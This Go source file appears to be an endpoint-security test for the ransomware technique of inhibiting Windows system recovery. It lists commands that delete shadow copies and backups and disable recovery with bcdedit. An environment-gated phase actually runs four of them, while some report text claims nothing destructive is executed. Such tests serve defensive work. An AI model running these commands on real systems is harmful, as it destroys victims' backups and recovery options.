//go:build windows
// +build windows

/*
ID: e1b7f2a5-0c6d-7b4e-1f8a-5d6e7f8a9b05
NAME: System Recovery Inhibition (Non-Destructive Mode)
TECHNIQUES: T1490
TACTICS: impact
SEVERITY: critical
TARGET: windows-endpoint
COMPLEXITY: medium
THREAT_ACTOR: N/A
SUBCATEGORY: impact
TAGS: recovery-inhibition, shadow-copy, vssadmin, bcdedit
SOURCE_URL: https://top-attack-techniques.mitre-engenuity.org/
UNIT: response
CREATED: 2026-01-11
AUTHOR: sectest-builder
*/
package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

const (
	TEST_UUID  = "e1b7f2a5-0c6d-7b4e-1f8a-5d6e7f8a9b05"
	TEST_NAME  = "System Recovery Inhibition (Non-Destructive Mode)"
	TARGET_DIR = "c:\\F0"

	// ExitTestError is the framework test-error exit code. The vendored prelude
	// endpoint lib maps UnexpectedTestError to exit 1 — do not use it (CLAUDE.md).
	ExitTestError = 999
)

// RecoveryToolCheck represents the result of checking a recovery tool
type RecoveryToolCheck struct {
	ToolName    string
	ToolPath    string
	Accessible  bool
	QueryOutput string
	Blocked     bool
	ErrorMsg    string
}

// DestructiveCommand represents a command that ransomware WOULD execute
// These are logged but NEVER actually executed
type DestructiveCommand struct {
	Name        string
	Command     string
	Description string
	Impact      string
}

// getDestructiveCommands returns the list of commands that ransomware typically executes
// CRITICAL: These commands are for DOCUMENTATION ONLY - never execute them
func getDestructiveCommands() []DestructiveCommand {
	return []DestructiveCommand{
		{
			Name:        "Delete Shadow Copies",
			Command:     "vssadmin delete shadows /all /quiet",
			Description: "Deletes all Volume Shadow Copies on the system",
			Impact:      "Prevents restoration of files from previous versions",
		},
		{
			Name:        "Delete Shadow Copies (Alt)",
			Command:     "vssadmin delete shadows /for=c: /quiet",
			Description: "Deletes shadow copies for C: drive specifically",
			Impact:      "Targets primary system/user data drive",
		},
		{
			Name:        "Disable Recovery Mode",
			Command:     "bcdedit /set {default} recoveryenabled No",
			Description: "Disables Windows Recovery Environment",
			Impact:      "Prevents booting into recovery mode after attack",
		},
		{
			Name:        "Disable Boot Status Policy",
			Command:     "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
			Description: "Ignores boot failures that would trigger recovery",
			Impact:      "System won't auto-recover on boot failures",
		},
		{
			Name:        "Delete System State Backup",
			Command:     "wbadmin delete systemstatebackup -keepVersions:0",
			Description: "Deletes all system state backups",
			Impact:      "Removes system restore points and backups",
		},
		{
			Name:        "Delete Backup Catalog",
			Command:     "wbadmin delete catalog -quiet",
			Description: "Deletes the Windows backup catalog",
			Impact:      "Removes ability to restore from Windows Backup",
		},
		{
			Name:        "WMI Shadow Delete",
			Command:     `wmic shadowcopy delete /nointeractive`,
			Description: "Uses WMI to delete shadow copies",
			Impact:      "Alternative method used by some ransomware",
		},
		{
			Name:        "Resize Shadow Storage",
			Command:     "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB",
			Description: "Resizes shadow storage to minimum",
			Impact:      "Limits number of shadow copies that can be stored",
		},
	}
}

// checkToolAccessibility checks if a recovery tool is accessible
// This performs READ-ONLY operations only
func checkToolAccessibility(toolName, toolPath string) RecoveryToolCheck {
	result := RecoveryToolCheck{
		ToolName:   toolName,
		ToolPath:   toolPath,
		Accessible: false,
		Blocked:    false,
	}

	// Check if the tool exists
	if _, err := os.Stat(toolPath); os.IsNotExist(err) {
		result.ErrorMsg = "Tool not found at path"
		return result
	}

	// Tool exists
	result.Accessible = true
	return result
}

// executeReadOnlyQuery executes a read-only query command.
// Block evidence: exact OS "Access is denied" in output/error ONLY — and the
// caller guarantees elevated context (the test aborts with 999 before any
// query when non-admin). "requires elevation" is NOT protection evidence.
// Output is teed via MultiWriter and persisted to LOG_DIR.
func executeReadOnlyQuery(toolName, toolPath string, args []string) (string, bool, bool, string) {
	Endpoint.Say("  Executing read-only query: %s %s", toolPath, strings.Join(args, " "))

	cmd := exec.Command(toolPath, args...)

	var outputBuffer bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &outputBuffer)
	cmd.Stderr = io.MultiWriter(os.Stderr, &outputBuffer)

	err := cmd.Run()
	outputStr := outputBuffer.String()

	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	cmdLine := fmt.Sprintf("%s %s", toolPath, strings.Join(args, " "))

	// Persist full output for analysis
	if len(outputStr) > 0 {
		outputPath := filepath.Join(TARGET_DIR, strings.ToLower(toolName)+"_output.txt")
		os.WriteFile(outputPath, []byte(outputStr), 0644)
		LogFileDropped(strings.ToLower(toolName)+"_output.txt", outputPath, int64(len(outputStr)), false)
	}

	if err != nil {
		errorStr := err.Error()
		exitCode := 1
		if cmd.ProcessState != nil {
			exitCode = cmd.ProcessState.ExitCode()
		}

		// Positive evidence ONLY: the canonical OS denial string (we are
		// guaranteed elevated here, so a denial is not a privilege artifact).
		if strings.Contains(outputStr, "Access is denied") || strings.Contains(errorStr, "Access is denied") {
			LogProcessExecution(toolName, cmdLine, pid, false, 126, "Blocked by security controls (OS denial)")
			return outputStr, false, true, fmt.Sprintf("Blocked: %s", errorStr)
		}

		// Non-blocking error (incl. "requires elevation" — an elevation
		// requirement is an environment property, not a protection action).
		LogProcessExecution(toolName, cmdLine, pid, false, exitCode, errorStr)
		return outputStr, false, false, errorStr
	}

	LogProcessExecution(toolName, cmdLine, pid, true, 0, "")
	return outputStr, true, false, ""
}

// checkVssadmin checks vssadmin.exe accessibility and executes read-only query
func checkVssadmin() RecoveryToolCheck {
	result := checkToolAccessibility("vssadmin.exe", "C:\\Windows\\System32\\vssadmin.exe")

	if !result.Accessible {
		return result
	}

	// Execute read-only query: list shadows
	output, success, blocked, errMsg := executeReadOnlyQuery(
		"vssadmin.exe",
		"C:\\Windows\\System32\\vssadmin.exe",
		[]string{"list", "shadows"},
	)

	result.QueryOutput = output
	result.Blocked = blocked

	if blocked {
		result.ErrorMsg = errMsg
		LogMessage("INFO", "vssadmin Check", "Read-only query was BLOCKED by EDR")
	} else if success {
		LogMessage("INFO", "vssadmin Check", "Read-only query executed successfully")
	} else {
		result.ErrorMsg = errMsg
		LogMessage("WARN", "vssadmin Check", fmt.Sprintf("Query failed: %s", errMsg))
	}

	return result
}

// checkBcdedit checks bcdedit.exe accessibility and executes read-only query
func checkBcdedit() RecoveryToolCheck {
	result := checkToolAccessibility("bcdedit.exe", "C:\\Windows\\System32\\bcdedit.exe")

	if !result.Accessible {
		return result
	}

	// Execute read-only query: enum boot config
	output, success, blocked, errMsg := executeReadOnlyQuery(
		"bcdedit.exe",
		"C:\\Windows\\System32\\bcdedit.exe",
		[]string{"/enum"},
	)

	result.QueryOutput = output
	result.Blocked = blocked

	if blocked {
		result.ErrorMsg = errMsg
		LogMessage("INFO", "bcdedit Check", "Read-only query was BLOCKED by EDR")
	} else if success {
		LogMessage("INFO", "bcdedit Check", "Read-only query executed successfully")
	} else {
		result.ErrorMsg = errMsg
		LogMessage("WARN", "bcdedit Check", fmt.Sprintf("Query failed: %s", errMsg))
	}

	return result
}

// checkWbadmin checks wbadmin.exe accessibility
func checkWbadmin() RecoveryToolCheck {
	result := checkToolAccessibility("wbadmin.exe", "C:\\Windows\\System32\\wbadmin.exe")

	if !result.Accessible {
		return result
	}

	// Execute read-only query: get status
	// Note: wbadmin status might require elevation, using get versions as alternative
	output, success, blocked, errMsg := executeReadOnlyQuery(
		"wbadmin.exe",
		"C:\\Windows\\System32\\wbadmin.exe",
		[]string{"get", "versions"},
	)

	result.QueryOutput = output
	result.Blocked = blocked

	if blocked {
		result.ErrorMsg = errMsg
		LogMessage("INFO", "wbadmin Check", "Read-only query was BLOCKED by EDR")
	} else if success {
		LogMessage("INFO", "wbadmin Check", "Read-only query executed successfully")
	} else {
		result.ErrorMsg = errMsg
		LogMessage("WARN", "wbadmin Check", fmt.Sprintf("Query failed: %s", errMsg))
	}

	return result
}

// isRunningAsAdmin checks if the current process has administrator privileges
func isRunningAsAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// writeTestReport writes a comprehensive test report to c:\F0
func writeTestReport(vss, bcd, wba RecoveryToolCheck, anyBlocked bool) {
	reportPath := filepath.Join(TARGET_DIR, "recovery_inhibition_report.txt")

	destructiveCommands := getDestructiveCommands()

	report := fmt.Sprintf(`System Recovery Inhibition (Non-Destructive Mode) Test Report
===================================================
Test ID: %s
Timestamp: %s
MITRE ATT&CK: T1490 (Inhibit System Recovery)

IMPORTANT: Non-destructive mode - NO destructive operations performed. The destructive T1490 command set below is DOCUMENTATION ONLY (the executed tradecraft is read-only recon: vssadmin list shadows, bcdedit /enum, wbadmin get versions).
All checks are READ-ONLY

=== Tool Accessibility Check ===

1. vssadmin.exe (Volume Shadow Copy Administration)
   Path: C:\Windows\System32\vssadmin.exe
   Accessible: %v
   Query Blocked: %v
   Error: %s
   Query Output (truncated):
   %s

2. bcdedit.exe (Boot Configuration Data Editor)
   Path: C:\Windows\System32\bcdedit.exe
   Accessible: %v
   Query Blocked: %v
   Error: %s
   Query Output (truncated):
   %s

3. wbadmin.exe (Windows Backup Administration)
   Path: C:\Windows\System32\wbadmin.exe
   Accessible: %v
   Query Blocked: %v
   Error: %s
   Query Output (truncated):
   %s

=== Commands Ransomware WOULD Execute (NOT EXECUTED) ===
The following commands are what ransomware typically executes during T1490.
These were LOGGED but NOT EXECUTED for safety.

`,
		TEST_UUID,
		time.Now().Format("2006-01-02 15:04:05"),
		vss.Accessible, vss.Blocked, vss.ErrorMsg, truncateOutput(vss.QueryOutput, 500),
		bcd.Accessible, bcd.Blocked, bcd.ErrorMsg, truncateOutput(bcd.QueryOutput, 500),
		wba.Accessible, wba.Blocked, wba.ErrorMsg, truncateOutput(wba.QueryOutput, 500),
	)

	for i, cmd := range destructiveCommands {
		report += fmt.Sprintf(`%d. %s
   Command: %s
   Description: %s
   Impact: %s

`, i+1, cmd.Name, cmd.Command, cmd.Description, cmd.Impact)
	}

	report += fmt.Sprintf(`
=== Assessment ===
Any Read-Only Queries Blocked: %v
Tools Accessible: vssadmin=%v, bcdedit=%v, wbadmin=%v

%s

=== Detection Opportunities for Defenders ===
1. Process creation for vssadmin.exe, bcdedit.exe, wbadmin.exe
2. Command line arguments containing "delete", "shadows", "recoveryenabled"
3. WMI queries targeting Win32_ShadowCopy
4. Registry modifications to BCD store
5. Event logs: VSS events (8193, 8194), bcdedit changes

=== End of Report ===
`,
		anyBlocked,
		vss.Accessible, bcd.Accessible, wba.Accessible,
		getAssessmentText(vss, bcd, wba, anyBlocked),
	)

	os.WriteFile(reportPath, []byte(report), 0644)
	LogFileDropped("recovery_inhibition_report.txt", reportPath, int64(len(report)), false)
	Endpoint.Say("  [+] Test report saved to: %s", reportPath)
}

// truncateOutput truncates output string to maxLen
func truncateOutput(s string, maxLen int) string {
	if len(s) > maxLen {
		return s[:maxLen] + "\n   ... (truncated)"
	}
	return s
}

// getAssessmentText generates assessment based on results
func getAssessmentText(vss, bcd, wba RecoveryToolCheck, anyBlocked bool) string {
	if anyBlocked {
		return "PROTECTED: EDR blocked read-only queries to recovery tools.\nThis indicates active protection against T1490 reconnaissance."
	}

	allAccessible := vss.Accessible && bcd.Accessible && wba.Accessible
	if allAccessible {
		return "VULNERABLE: All recovery tools are accessible and queryable.\nRansomware could execute T1490 techniques to inhibit system recovery."
	}

	return "PARTIAL: Some recovery tools are not accessible (may indicate missing features or permissions)."
}

// logDestructiveCommands logs the commands that WOULD be executed by ransomware
// CRITICAL: These are for documentation only - never executed
func logDestructiveCommands() {
	Endpoint.Say("\n  Documenting destructive commands (NOT EXECUTING):")

	for _, cmd := range getDestructiveCommands() {
		LogMessage("INFO", "Destructive Command (NOT EXECUTED)", fmt.Sprintf(
			"Command: %s | Description: %s | Impact: %s",
			cmd.Command, cmd.Description, cmd.Impact))
		Endpoint.Say("    [DOC] %s: %s", cmd.Name, cmd.Command)
	}
}

// createMarkerFile creates a marker file to track test execution
func createMarkerFile(name, content string) {
	markerPath := filepath.Join(TARGET_DIR, name)
	if err := os.WriteFile(markerPath, []byte(content), 0644); err == nil {
		LogFileDropped(name, markerPath, int64(len(content)), false)
	}
}

// destructiveGate is the env var that arms the REAL destructive T1490 phase.
// Default (unset) = non-destructive mode only (documented commands, read-only
// queries). The destructive phase deletes volume shadow copies and modifies
// BCD — REQUIRES a hypervisor snapshot of the lab VM before arming.
const destructiveGate = "F0_DESTRUCTIVE_T1490"

// bcdReverts records BCD settings changed by the destructive phase so cleanup
// can revert them FIRST, on every exit path (revert-first ordering).
var bcdReverts []struct{ Set, Revert, Args string }

// executeDestructivePhase runs the REAL destructive T1490 command set.
// ARMED ONLY via env F0_DESTRUCTIVE_T1490=1 (user decision 2026-11-03).
// Safe-mode boot staging (bcdedit /set safeboot minimal) is intentionally
// EXCLUDED even when armed: un-reverted safeboot bricks normal boot, and its
// detection value overlaps the included commands.
// Returns: destructiveCount, blockedEvidence, msg
func executeDestructivePhase() (int, bool, string) {
	if os.Getenv(destructiveGate) != "1" {
		Endpoint.Say("  [GATE] %s != 1 — destructive T1490 phase DISABLED (documented-only)", destructiveGate)
		Endpoint.Say("         To arm: set %s=1 AND take a hypervisor snapshot first (see README)", destructiveGate)
		LogMessage("INFO", "Destructive Phase", "Gated off: env "+destructiveGate+" not set to 1")
		return 0, false, "disabled by gate"
	}

	Endpoint.Say("  [!!] DESTRUCTIVE T1490 PHASE ARMED — executing real commands")
	Endpoint.Say("       (requires prior hypervisor snapshot; shadow copies WILL be deleted)")
	LogMessage("WARN", "Destructive Phase", "ARMED via "+destructiveGate+"=1 — executing real destructive T1490 commands")

	destructive := 0
	blocked := false

	type dcmd struct {
		desc, tool                   string
		args                         []string
		setting, setVal, revertVal   string // for BCD-revertible settings
	}
	cmds := []dcmd{
		{desc: "Delete all volume shadow copies", tool: "C:\\Windows\\System32\\vssadmin.exe", args: []string{"delete", "shadows", "/all", "/quiet"}},
		{desc: "Disable Windows Recovery Environment", tool: "C:\\Windows\\System32\\bcdedit.exe", args: []string{"/set", "{default}", "recoveryenabled", "No"}, setting: "recoveryenabled", setVal: "No", revertVal: "Yes"},
		{desc: "Ignore boot failures (no auto-recovery)", tool: "C:\\Windows\\System32\\bcdedit.exe", args: []string{"/set", "{default}", "bootstatuspolicy", "ignoreallfailures"}, setting: "bootstatuspolicy", setVal: "ignoreallfailures", revertVal: "displayallfailures"},
		{desc: "Delete Windows backup catalog", tool: "C:\\Windows\\System32\\wbadmin.exe", args: []string{"delete", "catalog", "-quiet"}},
	}

	for _, dc := range cmds {
		Endpoint.Say("  [DESTRUCTIVE] %s: %s %s", dc.desc, dc.tool, strings.Join(dc.args, " "))

		cmd := exec.Command(dc.tool, dc.args...)
		var buf bytes.Buffer
		cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
		cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
		err := cmd.Run()
		out := buf.String()
		pid := 0
		if cmd.Process != nil {
			pid = cmd.Process.Pid
		}
		exitCode := 0
		if err != nil && cmd.ProcessState != nil {
			exitCode = cmd.ProcessState.ExitCode()
		}

		if len(out) > 0 {
			safe := strings.Map(func(r rune) rune { if r == ' ' { return '_' }; return r }, filepath.Base(dc.tool))
			os.WriteFile(filepath.Join(TARGET_DIR, "destructive_"+safe+"_output.txt"), []byte(out), 0644)
		}

		if err != nil {
			if strings.Contains(out, "Access is denied") || strings.Contains(err.Error(), "Access is denied") {
				LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, false, 126, "denied (positive evidence)")
				blocked = true
			} else {
				LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, false, exitCode, err.Error())
			}
			continue
		}

		LogProcessExecution(filepath.Base(dc.tool), dc.tool+" "+strings.Join(dc.args, " "), pid, true, 0, "")
		destructive++

		// Register the revert for BCD-changeable settings (revert-first cleanup)
		if dc.setting != "" {
			bcdReverts = append(bcdReverts, struct{ Set, Revert, Args string }{dc.setting, dc.revertVal, "{default}"})
		}
	}

	return destructive, blocked, fmt.Sprintf("%d destructive commands executed, blocked=%v", destructive, blocked)
}

// revertBcdSettings reverts every BCD change registered by the destructive
// phase. Called FIRST in cleanup on every exit path (revert-first ordering).
func revertBcdSettings() {
	for _, r := range bcdReverts {
		Endpoint.Say("  [REVERT] bcdedit /set %s %s %s", r.Args, r.Set, r.Revert)
		cmd := exec.Command("C:\\Windows\\System32\\bcdedit.exe", "/set", r.Args, r.Set, r.Revert)
		out, err := cmd.CombinedOutput()
		if err != nil {
			LogMessage("ERROR", "BCD Revert", fmt.Sprintf("REVERT FAILED for %s=%s: %v — %s", r.Set, r.Revert, err, string(out)))
			Endpoint.Say("  [!!] BCD REVERT FAILED for %s — MANUAL FIX REQUIRED: bcdedit /set %s %s %s", r.Set, r.Args, r.Set, r.Revert)
		} else {
			LogMessage("INFO", "BCD Revert", fmt.Sprintf("Reverted %s to %s", r.Set, r.Revert))
		}
	}
	bcdReverts = nil
}

// cleanup removes test report and marker files (was absent — audit 2026-11-03)
func cleanup() {
	Endpoint.Say("\nCleaning up test artifacts...")

	// REVERT-FIRST: undo any BCD changes before anything else so no exit path
	// leaves the system in an inhibited-recovery state.
	revertBcdSettings()
	for _, f := range []string{
		"recovery_inhibition_report.txt",
		"t1490_test_started.txt",
		"t1490_test_completed.txt",
		"vssadmin.exe_output.txt",
		"bcdedit.exe_output.txt",
		"wbadmin.exe_output.txt",
		"destructive_vssadmin.exe_output.txt",
		"destructive_bcdedit.exe_output.txt",
		"destructive_wbadmin.exe_output.txt",
	} {
		if err := os.Remove(filepath.Join(TARGET_DIR, f)); err == nil {
			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", f))
		}
	}
}

func test() {
	defer func() {
		if r := recover(); r != nil {
			if globalLog != nil {
				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
				SaveLog(ExitTestError, fmt.Sprintf("Panic: %v", r))
			}
			cleanup()
			Endpoint.Stop(ExitTestError)
		}
	}()

	// Results tracking
	var vssResult, bcdResult, wbaResult RecoveryToolCheck
	anyBlocked := false
	allAccessible := true

	// Phase 1: Initialization
	LogPhaseStart(1, "Initialization")
	Endpoint.Say("Phase 1: Initializing test environment")

	// NOTE: Endpoint.Dropper call removed — it dropped an unused binary into CWD
	// on every run and was never executed (audit 2026-11-03).

	// Create target directory
	if err := os.MkdirAll(TARGET_DIR, 0755); err != nil {
		LogPhaseError(0, fmt.Sprintf("Failed to create target directory: %v", err))
		LogPhaseEnd(0, "failed", "Failed to create target directory")
		SaveLog(ExitTestError, "Failed to create target directory")
		Endpoint.Stop(ExitTestError)
	}

	// PRIVILEGE GATE FIRST (Bug Prevention Rule 8): bcdedit/wbadmin queries
	// REQUIRE elevation. Running them non-elevated emits "Access is denied" /
	// "requires elevation" that must never be classified as protection. Abort
	// with 999 before any tool probe when not elevated.
	isAdmin := isRunningAsAdmin()
	if !isAdmin {
		Endpoint.Say("  [ABORT] Administrator privileges are required (bcdedit/wbadmin queries need elevation)")
		Endpoint.Say("          Re-run elevated; a non-elevated denial is an environment property, not protection")
		LogMessage("ERROR", "Initialization", "Not running as administrator - aborting before tool queries (denials would be unclassifiable)")
		LogPhaseEnd(0, "failed", "Administrator privileges required")
		SaveLog(ExitTestError, "Prerequisites not met: Administrator privileges required")
		cleanup()
		Endpoint.Stop(ExitTestError) // Exit 999
	}
	Endpoint.Say("  [+] Running as administrator")
	LogMessage("INFO", "Initialization", "Running with administrator privileges")

	// Create start marker
	createMarkerFile("t1490_test_started.txt",
		fmt.Sprintf("T1490 Non-Destructive Test Started\nTimestamp: %s\n", time.Now().Format(time.RFC3339)))

	LogPhaseEnd(0, "success", "Environment initialized (elevated)")

	// Phase 2: Check vssadmin.exe
	LogPhaseStart(2, "vssadmin Check")
	Endpoint.Say("\nPhase 2: Checking vssadmin.exe (Volume Shadow Copy)")
	Endpoint.Say("  Purpose: Test read-only query 'vssadmin list shadows'")

	vssResult = checkVssadmin()

	if vssResult.Blocked {
		Endpoint.Say("  [BLOCKED] vssadmin read-only query was blocked by EDR")
		anyBlocked = true
		LogPhaseEnd(1, "blocked", "vssadmin query blocked by security controls")
	} else if vssResult.Accessible {
		Endpoint.Say("  [ACCESSIBLE] vssadmin.exe is accessible and queryable")
		LogPhaseEnd(1, "success", "vssadmin accessible and queryable")
	} else {
		Endpoint.Say("  [ERROR] vssadmin check failed: %s", vssResult.ErrorMsg)
		allAccessible = false
		LogPhaseEnd(1, "failed", vssResult.ErrorMsg)
	}

	Endpoint.Wait(2)

	// Phase 3: Check bcdedit.exe
	LogPhaseStart(3, "bcdedit Check")
	Endpoint.Say("\nPhase 3: Checking bcdedit.exe (Boot Configuration)")
	Endpoint.Say("  Purpose: Test read-only query 'bcdedit /enum'")

	bcdResult = checkBcdedit()

	if bcdResult.Blocked {
		Endpoint.Say("  [BLOCKED] bcdedit read-only query was blocked by EDR")
		anyBlocked = true
		LogPhaseEnd(2, "blocked", "bcdedit query blocked by security controls")
	} else if bcdResult.Accessible {
		Endpoint.Say("  [ACCESSIBLE] bcdedit.exe is accessible and queryable")
		LogPhaseEnd(2, "success", "bcdedit accessible and queryable")
	} else {
		Endpoint.Say("  [ERROR] bcdedit check failed: %s", bcdResult.ErrorMsg)
		allAccessible = false
		LogPhaseEnd(2, "failed", bcdResult.ErrorMsg)
	}

	Endpoint.Wait(2)

	// Phase 4: Check wbadmin.exe
	LogPhaseStart(4, "wbadmin Check")
	Endpoint.Say("\nPhase 4: Checking wbadmin.exe (Windows Backup)")
	Endpoint.Say("  Purpose: Test read-only query 'wbadmin get versions'")

	wbaResult = checkWbadmin()

	if wbaResult.Blocked {
		Endpoint.Say("  [BLOCKED] wbadmin read-only query was blocked by EDR")
		anyBlocked = true
		LogPhaseEnd(3, "blocked", "wbadmin query blocked by security controls")
	} else if wbaResult.Accessible {
		Endpoint.Say("  [ACCESSIBLE] wbadmin.exe is accessible and queryable")
		LogPhaseEnd(3, "success", "wbadmin accessible and queryable")
	} else {
		Endpoint.Say("  [ERROR] wbadmin check failed: %s", wbaResult.ErrorMsg)
		allAccessible = false
		LogPhaseEnd(3, "failed", wbaResult.ErrorMsg)
	}

	Endpoint.Wait(2)

	// Phase 5: Document Destructive Commands (NOT EXECUTED)
	LogPhaseStart(5, "Destructive Command Documentation")
	Endpoint.Say("\nPhase 5: Documenting ransomware commands (SAFE - NOT EXECUTING)")
	Endpoint.Say("  These commands are what ransomware WOULD execute for T1490")

	logDestructiveCommands()

	LogPhaseEnd(4, "success", "Destructive commands documented for reference")

	// Phase 5b: REAL destructive execution (env-gated, snapshot required)
	LogPhaseStart(6, "Destructive Execution (gated)")
	Endpoint.Say("\nPhase 5b: Destructive T1490 execution (gated by %s)", destructiveGate)

	destructiveCount, destructiveBlocked, dmsg := executeDestructivePhase()
	if destructiveBlocked {
		anyBlocked = true
		LogPhaseEnd(5, "blocked", dmsg)
	} else if destructiveCount > 0 {
		successCount := destructiveCount
		_ = successCount
		LogPhaseEnd(5, "success", dmsg)
	} else {
		LogPhaseEnd(5, "skipped", dmsg)
	}

	// Phase 6: Final Assessment
	LogPhaseStart(6, "Final Assessment")
	Endpoint.Say("\nPhase 6: Final assessment and report generation")

	// Write comprehensive report
	writeTestReport(vssResult, bcdResult, wbaResult, anyBlocked)

	// Create completion marker
	createMarkerFile("t1490_test_completed.txt",
		fmt.Sprintf("T1490 Non-Destructive Test Completed\nTimestamp: %s\nBlocked: %v\n",
			time.Now().Format(time.RFC3339), anyBlocked))

	LogPhaseEnd(5, "success", "Assessment complete")

	// Final result output
	Endpoint.Say("\n========================================")
	Endpoint.Say("TEST RESULTS SUMMARY")
	Endpoint.Say("========================================")
	Endpoint.Say("MITRE ATT&CK: T1490 (Inhibit System Recovery)")
	Endpoint.Say("Mode: Non-Destructive (Read-Only Checks Only; destructive T1490 commands documented, never executed)")
	Endpoint.Say("")
	Endpoint.Say("Tool Accessibility:")
	Endpoint.Say("  - vssadmin.exe: Accessible=%v, Blocked=%v", vssResult.Accessible, vssResult.Blocked)
	Endpoint.Say("  - bcdedit.exe:  Accessible=%v, Blocked=%v", bcdResult.Accessible, bcdResult.Blocked)
	Endpoint.Say("  - wbadmin.exe:  Accessible=%v, Blocked=%v", wbaResult.Accessible, wbaResult.Blocked)
	Endpoint.Say("")
	Endpoint.Say("Any Queries Blocked: %v", anyBlocked)

	// Exit code determination (anyBlocked can only be true with admin-gated
	// positive OS-denial evidence — never from a privilege artifact)
	if anyBlocked {
		// EDR/OS blocked at least one read-only query - system is protected
		Endpoint.Say("\n[RESULT] PROTECTED - EDR blocked read-only queries to recovery tools")
		Endpoint.Say("Exit Code: 126 (Execution Prevented)")
		LogMessage("INFO", "Final Assessment", "System PROTECTED - EDR blocked recovery tool queries")
		SaveLog(Endpoint.ExecutionPrevented, "Protected: Read-only queries blocked")
		cleanup()
		Endpoint.Stop(Endpoint.ExecutionPrevented) // Exit 126
	} else if allAccessible {
		// All tools accessible (admin-gated) - system is vulnerable to T1490 recon
		Endpoint.Say("\n[RESULT] VULNERABLE - All recovery tools accessible")
		Endpoint.Say("         Ransomware could execute T1490 to inhibit system recovery")
		Endpoint.Say("Exit Code: 101 (Unprotected)")
		LogMessage("CRITICAL", "Final Assessment", "System VULNERABLE - recovery tools accessible")
		SaveLog(Endpoint.Unprotected, "Vulnerable: All recovery tools accessible for T1490")
		cleanup()
		Endpoint.Stop(Endpoint.Unprotected) // Exit 101
	} else {
		// Some tools not accessible but not blocked - inconclusive, NOT a
		// protection result (benign environment outcome must not become 101/126)
		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Some recovery tools not accessible (not a protection result)")
		Endpoint.Say("Exit Code: 999 (Test Error)")
		LogMessage("WARN", "Final Assessment", "Inconclusive - some tools inaccessible without block evidence")
		SaveLog(ExitTestError, "Inconclusive: some recovery tools inaccessible without block evidence")
		cleanup()
		Endpoint.Stop(ExitTestError) // Exit 999
	}
}

func main() {
	Endpoint.Say("Starting test at: %s", time.Now().Format("2006-01-02T15:04:05"))
	Endpoint.Say("Test: %s", TEST_NAME)
	Endpoint.Say("UUID: %s", TEST_UUID)
	Endpoint.Say("MITRE ATT&CK: T1490 (Inhibit System Recovery)")
	Endpoint.Say("")
	if os.Getenv(destructiveGate) == "1" {
		Endpoint.Say("!!! DESTRUCTIVE MODE ARMED (%s=1) !!!", destructiveGate)
		Endpoint.Say("REAL destructive T1490 commands WILL execute (snapshot required)")
	} else {
		Endpoint.Say("!!! NON-DESTRUCTIVE MODE TEST !!!")
		Endpoint.Say("This test performs READ-ONLY checks only")
		Endpoint.Say("NO destructive operations will be executed (arm with %s=1 + snapshot)", destructiveGate)
	}
	Endpoint.Say("")

	// Initialize Schema v2.0 compliant logger
	metadata := TestMetadata{
		Version:       "1.0.0",
		Category:      "impact",
		Severity:      "critical",
		Techniques:    []string{"T1490"},
		Tactics:       []string{"impact"},
		Score:         7.9, // v2.1 — lab-verified 2026-11-03 on the win lab (Sophos Intercept X). See info.md v2.1 scorecard.
		RubricVersion: "v2.1",
		// ScoreBreakdown intentionally nil under v2.1 — the v1 dimensions in
		// the struct do not match the v2.1 tiered structure. The v2.1 breakdown
		// lives in the info.md scorecard table.
		Tags: []string{"ransomware", "recovery-inhibition", "vssadmin", "bcdedit", "wbadmin", "safe-mode", "native"},
	}

	// Resolve organization from registry
	orgInfo := ResolveOrganization("")

	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
		Configuration: &ExecutionConfiguration{
			TimeoutMs:         240000,
			CertificateMode:   "not-required",
			MultiStageEnabled: false,
		},
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	// Run test with timeout
	done := make(chan bool, 1)
	go func() {
		// Panic recovery lives INSIDE the goroutine so a panic in test()
		// is recovered, logged and exits 999 instead of killing the process.
		defer func() {
			if r := recover(); r != nil {
				if globalLog != nil {
					LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
					SaveLog(ExitTestError, fmt.Sprintf("Test panic: %v", r))
				}
				cleanup()
				Endpoint.Stop(ExitTestError)
			}
		}()
		test()
		done <- true
	}()

	// 4 minutes: wbadmin get versions alone can take 30-60s
	timeout := 4 * time.Minute

	select {
	case <-done:
		Endpoint.Say("Test completed")
	case <-time.After(timeout):
		Endpoint.Say("Test timed out after %v", timeout)
		if globalLog != nil {
			LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		}
		cleanup()
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}
